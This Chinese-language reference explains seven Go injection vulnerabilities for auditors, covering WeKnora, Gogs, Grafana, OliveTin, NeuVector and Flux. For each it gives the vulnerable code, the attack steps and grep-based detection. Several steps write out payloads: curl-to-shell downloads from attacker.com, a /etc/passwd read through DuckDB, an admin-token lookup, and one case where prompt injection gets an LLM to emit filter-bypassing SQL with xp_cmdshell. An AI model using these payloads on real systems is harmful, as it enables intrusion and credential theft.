# Go Injection — Real-World Cases

7 个真实 Go 注入漏洞案例，每个代表一种独特的注入模式。

---

### Case 1: WeKnora -- MCP Stdio 命令注入导致 RCE (CVE-2026-30861, CVSS 10.0)

**Root Cause**: WeKnora 的 MCP stdio transport 配置验证功能允许用户指定要测试的命令，该命令未经过滤直接传入 `exec.Command("sh", "-c", ...)`，导致命令注入。

**Source -> Sink 路径**:
- **Source**: MCP stdio 配置中的 `command` 字段（HTTP API 参数）
- **Sink**: `exec.Command("sh", "-c", command)` — 通过 shell 执行用户输入
- **Sanitization Gap**: 命令字段未经任何过滤或白名单校验

**Vulnerable Code Pattern**:
```go
func testMCPStdio(config MCPStdioConfig) error {
    // BUG: 用户输入直接传入 shell
    cmd := exec.Command("sh", "-c", config.Command)
    output, err := cmd.CombinedOutput()
    return err
}
```

**Attack Path**:
1. 攻击者通过 API 提交 MCP stdio 配置测试请求
2. `command` 字段设为 `legitimate-cmd; curl attacker.com/shell.sh | sh`
3. WeKnora 通过 `sh -c` 执行，shell 解释 `;` 为命令分隔符
4. 攻击者获得服务器 RCE

**How to Detect**:
1. Grep `exec.Command("sh"\|exec.Command("bash"\|exec.Command("/bin/sh"` 查找 shell 调用
2. 追踪第三个参数是否来自用户输入
3. 确认是否有输入过滤或白名单

---

### Case 2: WeKnora -- AI 数据库查询 SQL 注入绕过 (CVE-2026-30860, CVSS 10.0)

**Root Cause**: WeKnora 的 AI 数据库查询工具将 LLM 生成的 SQL 直接执行，虽然有 SQL 过滤器，但攻击者可通过 prompt injection 让 LLM 生成绕过过滤器的 SQL，实现 SQL 注入到 RCE。

**Source -> Sink 路径**:
- **Source**: 用户自然语言查询 → LLM 生成 SQL
- **Sink**: `db.Exec(generatedSQL)` — 直接执行 LLM 输出的 SQL
- **Sanitization Gap**: SQL 过滤器使用关键字黑名单，可被编码或语法变体绕过

**Vulnerable Code Pattern**:
```go
func executeAIQuery(userQuestion string) (interface{}, error) {
    // LLM 生成 SQL
    sql := llm.GenerateSQL(userQuestion)

    // 简单的关键字过滤（易被绕过）
    if containsDangerousKeyword(sql) {
        return nil, errors.New("dangerous SQL detected")
    }

    // BUG: 直接执行 LLM 输出
    rows, err := db.Query(sql)
    return rows, err
}

func containsDangerousKeyword(sql string) bool {
    // 黑名单可被 SQL 注释、编码等方式绕过
    dangerous := []string{"DROP", "DELETE", "INSERT", "UPDATE", "EXEC"}
    for _, kw := range dangerous {
        if strings.Contains(strings.ToUpper(sql), kw) {
            return true
        }
    }
    return false
}
```

**Attack Path**:
1. 用户输入精心构造的自然语言查询（prompt injection）
2. LLM 生成包含恶意 SQL 的查询（如 `SELECT/**/1;EX/**/EC xp_cmdshell 'whoami'`）
3. 关键字过滤器被 SQL 注释绕过
4. SQL 执行导致数据泄露或 RCE

**How to Detect**:
1. Grep `db.Query\|db.Exec\|db.QueryRow` + 非参数化调用（无 `, args...`）
2. 检查 SQL 来源是否为 LLM 输出或用户拼接
3. 确认 SQL 过滤是否使用 AST 解析（安全）而非关键字黑名单（不安全）

---

### Case 3: Gogs -- SSH Argument Injection 导致 RCE (CVE-2024-39930, CVSS 10.0)

**Root Cause**: Gogs 的内建 SSH server 在处理 `git-receive-pack`/`git-upload-pack` 命令时，允许用户通过 Git 仓库 URL 注入 `--upload-pack` 等参数，该参数值被 Git 作为可执行命令运行。

**Source -> Sink 路径**:
- **Source**: SSH 连接中 Git 命令的参数（仓库路径）
- **Sink**: `exec.Command("git", "--upload-pack=<attacker_command>", ...)` — Git 执行攻击者指定的程序
- **Sanitization Gap**: 未过滤 `--` 开头的参数，允许参数注入

**Vulnerable Code Pattern**:
```go
func handleSSHCommand(cmd string) error {
    parts := strings.Fields(cmd)
    // cmd 例如: "git-upload-pack '--upload-pack=evil' /repo.git"
    // BUG: parts 中的参数直接传给 exec.Command
    gitCmd := exec.Command("git", parts...)
    return gitCmd.Run()
}

// 修复: 使用 "--" 分隔符防止参数注入
func handleSSHCommandFixed(cmd string) error {
    repo := extractRepoPath(cmd)
    gitCmd := exec.Command("git", "upload-pack", "--", repo)
    return gitCmd.Run()
}
```

**Attack Path**:
1. 攻击者通过 SSH 连接 Gogs
2. 发送 `git-upload-pack '--upload-pack=/usr/bin/id' /repo.git`
3. Gogs 将参数直接传给 `exec.Command`
4. Git 执行 `--upload-pack` 指定的命令

**How to Detect**:
1. Grep `exec.Command("git"` 查找 Git 命令执行
2. 检查参数是否来自用户输入且未使用 `--` 分隔符
3. 特别关注 `--upload-pack`、`--exec-path`、`--config` 等可执行参数

---

### Case 4: Grafana -- SQL Expression 命令注入 + 本地文件包含 (CVE-2024-9264, CVSS 10.0)

**Root Cause**: Grafana 的 SQL Expression 功能允许用户编写 SQL 查询，该查询被传递给 DuckDB 执行。DuckDB 支持 `read_csv`、`read_parquet` 等函数可读取本地文件，以及 `shell_exec` 可执行系统命令。

**Source -> Sink 路径**:
- **Source**: Grafana dashboard 中用户编写的 SQL expression
- **Sink**: DuckDB 的 `shell_exec()` 函数 / `read_csv('/etc/passwd')` 函数
- **Sanitization Gap**: SQL expression 未限制 DuckDB 的危险函数

**Vulnerable Code Pattern**:
```go
func executeSQLExpression(expr string) (*dataframe.Frame, error) {
    db, _ := sql.Open("duckdb", "")
    // BUG: 用户的 SQL expression 直接传给 DuckDB
    // DuckDB 支持 shell_exec(), read_csv() 等危险函数
    rows, err := db.Query(expr)
    return dataframeFromRows(rows), err
}
```

**Attack Path**:
1. 在 Grafana dashboard 中创建 SQL expression 面板
2. SQL 设为 `SELECT * FROM read_csv('/etc/passwd', header=false)`
3. DuckDB 读取服务器本地文件并返回内容
4. 或使用 `SELECT shell_exec('id')` 执行命令

**How to Detect**:
1. Grep `sql.Open\|db.Query\|db.Exec` 查找 SQL 执行
2. 检查 SQL 来源是否为用户输入
3. 确认是否限制了数据库引擎的危险函数（如 DuckDB 的 `shell_exec`）

---

### Case 5: OliveTin -- Password 参数类型 OS 命令注入 (CVSS 10.0)

**Root Cause**: OliveTin 的 `password` 类型参数在传递给 shell 命令时未经过转义，且 webhook JSON 提取功能也存在绕过 shell 转义的方法。

**Source -> Sink 路径**:
- **Source**: Web UI 中的 `password` 类型表单字段 / webhook JSON body
- **Sink**: `exec.Command("sh", "-c", commandWithPassword)` — shell 命令拼接
- **Sanitization Gap**: `password` 类型的输入被认为是"隐藏的"而非"危险的"，未进行 shell 转义

**Vulnerable Code Pattern**:
```go
func executeAction(action Action, args map[string]string) error {
    cmd := action.Shell
    for key, value := range args {
        // BUG: 简单字符串替换，password 类型参数未转义
        cmd = strings.Replace(cmd, "{{ "+key+" }}", value, -1)
    }
    return exec.Command("sh", "-c", cmd).Run()
}
```

**Attack Path**:
1. 配置 OliveTin action: `echo "Password: {{ password }}"`
2. 在 password 字段输入 `'; curl attacker.com/shell.sh | sh; echo '`
3. 拼接后: `echo "Password: '; curl attacker.com/shell.sh | sh; echo '"`
4. Shell 执行注入的命令

**How to Detect**:
1. Grep `strings.Replace.*exec.Command\|Sprintf.*exec.Command` 查找命令拼接
2. 检查参数替换是否在 `sh -c` 之前进行
3. 确认是否使用了 shell 转义或参数化方式传递

---

### Case 6: NeuVector -- Enforcer 命令注入 + 缓冲区溢出 (CVSS 10.0)

**Root Cause**: NeuVector Enforcer 组件在处理容器安全策略时存在命令注入漏洞，恶意容器名或镜像名中的特殊字符可被注入到 shell 命令中。

**Source -> Sink 路径**:
- **Source**: 容器名称 / 镜像名称（来自 container runtime API）
- **Sink**: `exec.Command("sh", "-c", "docker inspect " + containerName)` — shell 命令拼接
- **Sanitization Gap**: 容器/镜像名称未经过 shell 转义

**Vulnerable Code Pattern**:
```go
func inspectContainer(name string) ([]byte, error) {
    // BUG: container name 可能包含 shell 特殊字符
    cmd := exec.Command("sh", "-c", fmt.Sprintf("docker inspect %s", name))
    return cmd.Output()
}

// 修复: 不使用 shell
func inspectContainerFixed(name string) ([]byte, error) {
    cmd := exec.Command("docker", "inspect", name)
    return cmd.Output()
}
```

**Attack Path**:
1. 创建容器名为 `test$(curl attacker.com/payload.sh|sh)` 的容器
2. NeuVector Enforcer 执行安全扫描/检查
3. 容器名被拼接到 shell 命令中
4. `$()` 被 shell 解释并执行

**How to Detect**:
1. Grep `exec.Command("sh".*Sprintf\|exec.Command("bash".*Sprintf` 查找 shell + 格式化
2. 检查格式化参数是否来自不可信来源（container runtime, user input）
3. 建议改为 `exec.Command(binary, args...)` 不经过 shell

---

### Case 7: Flux Helm Controller -- Helm Values 模板注入导致 RCE (CVE-2022-24878, CVSS 10.0)

**Root Cause**: Flux helm-controller 在处理 HelmRelease 资源时，允许用户通过 `spec.values` 注入 Helm 模板表达式。Helm 模板引擎支持 `lookup` 函数可读取 K8s 资源，以及通过 `include` 链实现代码执行。

**Source -> Sink 路径**:
- **Source**: HelmRelease CR 的 `spec.values` 或 `spec.valuesFrom` 字段
- **Sink**: Helm 模板引擎的 `template.Execute()` — 执行注入的模板表达式
- **Sanitization Gap**: Values 中的 `{{ }}` 表达式未被转义或禁止

**Vulnerable Code Pattern**:
```go
func (r *HelmReleaseReconciler) renderChart(hr helmv2.HelmRelease) error {
    // BUG: values 可能包含 Helm 模板表达式
    // 如 {{ lookup "v1" "Secret" "kube-system" "admin-token" }}
    values := hr.Spec.Values
    chart, _ := loader.Load(chartPath)
    return renderTemplates(chart, values)
}
```

**Attack Path**:
1. 创建 HelmRelease 资源
2. `spec.values` 中注入 `{{ lookup "v1" "Secret" "kube-system" "admin-token" | toJson }}`
3. Helm 模板引擎解析并执行 `lookup` 函数
4. 读取 kube-system 中的 admin token

**How to Detect**:
1. Grep `spec.Values\|spec.ValuesFrom\|renderTemplate\|template.Execute` 查找模板渲染
2. 检查用户提供的 values 是否作为模板内容（而非纯数据）处理
3. 确认 Helm 模板引擎是否限制了 `lookup`、`include` 等危险函数
